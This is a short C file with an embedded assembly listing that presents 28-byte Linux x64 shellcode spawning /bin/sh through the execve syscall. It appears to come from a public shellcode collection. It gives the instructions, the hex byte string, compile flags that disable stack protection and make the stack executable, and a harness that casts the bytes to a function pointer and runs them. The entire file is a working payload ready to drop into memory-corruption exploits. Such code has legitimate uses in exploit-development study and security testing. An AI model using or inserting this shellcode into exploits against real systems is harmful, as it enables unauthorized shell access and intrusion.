/**
# Linux/x64 execve /bin/sh Shellcode (28 bytes)
# author: Brendan Scarvell
# compile: gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

[Bits 64]
section .text
    global _start
_start:
    xor rdx, rdx ; rdx = 0
    push rdx
    mov rax, 0x68732f6e69622f2f ; "//bin/sh" string
    push rax
    push rsp
    pop rdi
    push rdx
    push rdi
    push rsp
    pop rdx
    push rsp
    pop rsi
    push 0x3b     ; syscall execve
    pop rax
    syscall

*/

#include <stdio.h>

void main() {
	unsigned char shellcode[] = "\x48\x31\xd2\x52\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x54\x5f\x52\x57\x54\x5a\x54\x5e\x6a\x3b\x58\x0f\x05";

	int (*ret)() = (int(*)())shellcode;

	ret();

}
